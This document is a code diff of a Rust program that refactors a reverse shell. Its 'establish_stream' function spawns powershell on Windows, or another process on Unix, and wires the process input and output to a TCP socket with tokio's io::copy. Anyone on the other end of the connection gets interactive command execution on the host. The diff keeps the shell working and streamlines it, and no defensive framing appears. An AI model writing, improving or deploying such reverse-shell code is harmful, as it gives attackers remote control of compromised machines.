@@ -1,55 +1,35 @@
-#[cfg(unix)]
 use std::process::Stdio;
-
+use tokio::io;
 use tokio::net::TcpStream;
+use tokio::process::Command;
 
 #[cfg(windows)]
-async fn establish_stream(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
-    use std::process::Stdio;
-    use tokio::{
-        io::{AsyncReadExt, AsyncWriteExt},
-        process::Command,
-    };
-
+async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
     let mut child = Command::new("powershell")
-        .arg("-c")
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .spawn()
         .unwrap();
 
-    let mut stdin = child.stdin.take().unwrap();
-    let mut stdout = child.stdout.take().unwrap();
+    let (mut stream_read, mut stream_write) = stream.into_split();
 
-    loop {
-        let mut read_buf = vec![0; 4096];
-        let mut write_buf = vec![0; 4096];
+    let stdin_writer = async move {
+        io::copy(&mut stream_read, &mut child.stdin.take().unwrap())
+            .await
+            .unwrap();
+    };
+    let stdout_writer = async move {
+        io::copy(&mut child.stdout.take().unwrap(), &mut stream_write)
+            .await
+            .unwrap();
+    };
 
-        let (read_len, write_len) = tokio::select! {
-            read_len = stream.read(&mut read_buf) => {
-                let read_len = read_len?;
-                (read_len, 0)
-            },
-            write_len = stdout.read(&mut write_buf) => {
-                let write_len = write_len?;
-                (0, write_len)
-            }
-        };
-
-        if read_len > 0 {
-            stdin.write_all(&read_buf[..read_len]).await?;
-        }
-
-        if write_len > 0 {
-            stream.write_all(&write_buf[..write_len]).await?;
-        }
-    }
-
+    tokio::join!(stdin_writer, stdout_writer);
     Ok(())
 }
 
 #[cfg(unix)]
-fn establish_stream(stream: TcpStream) {
+async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
     use std::os::fd::{AsRawFd, FromRawFd};
     let fd = stream.as_raw_fd();
 
@@ -61,6 +41,8 @@ fn establish_stream(stream: TcpStream) {
         .unwrap()
         .wait()
         .unwrap();
+
+    Ok(())
 }
 
 #[tokio::main]
